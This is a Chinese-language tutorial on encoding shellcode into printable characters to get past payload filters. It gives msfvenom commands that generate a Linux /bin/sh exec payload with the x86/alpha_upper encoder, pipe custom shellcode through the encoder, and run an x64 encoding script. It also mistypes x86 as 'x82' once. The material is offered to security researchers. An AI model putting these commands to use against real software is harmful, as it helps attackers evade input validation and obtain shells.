在某些情况下，程序会对payload执行可打印字符检查（例如UTF-8编码验证），这时常规的shellcode可能无法绕过这种安全机制。为了应对这种情况，需要对shellcode进行适当的编码处理。本文将介绍两种有效的shellcode编码方法。

### x86 Shellcode 编码

对于x82架构下的shellcode编码，可以利用Metasploit框架(MSF)内置的编码器来完成这一任务。

#### 查看可用编码器
通过`msfvenom -l encoders`命令可以列出所有支持的编码器。
```bash
ex@Ex:~$ msfvenom -l encoders
...
```

#### 使用示例
如果想使用`x86/alpha_upper`编码器生成一个针对Linux平台的、执行`/bin/sh`命令的shellcode，可以通过如下命令实现：
```bash
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax
```
这里需要注意的是，如果不指定`BufferRegister`参数，则生成的shellcode会包含一些额外指令用于确定自身位置，而这些指令可能不是由可打印字符组成的。

#### 输出结果
执行上述命令后，将得到一段经过编码的shellcode，并以Python格式输出。

### 自定义Shellcode编码
同样地，也可以对自己编写的shellcode进行编码。假设有一个名为`shellcode`的文件，其内容为待编码的原始shellcode，则可以使用管道符将其传给`msfvenom`进行处理：
```bash
cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax
```

### x64 Shellcode 编码
对于x64架构，虽然MSF目前没有提供类似于`x86/alpha_upper`的直接选项，但可以在GitHub上找到其他开源工具来进行类似的操作。这类工具通常也需要用户提供shellcode的确切地址信息以便正确编码。

#### 使用步骤
1. 首先确保你已经准备好了想要编码的shellcode。
2. 利用特定脚本或程序对其进行转换。例如，若要基于RAX寄存器加29偏移量的位置进行编码，可以运行：
   ```bash
   python2 main.py shellcode rax+29
   ```

以上就是关于如何根据不同的CPU架构选择合适的方法来对shellcode进行编码的基本指南。希望这能帮助到正在寻找解决方案的安全研究人员们。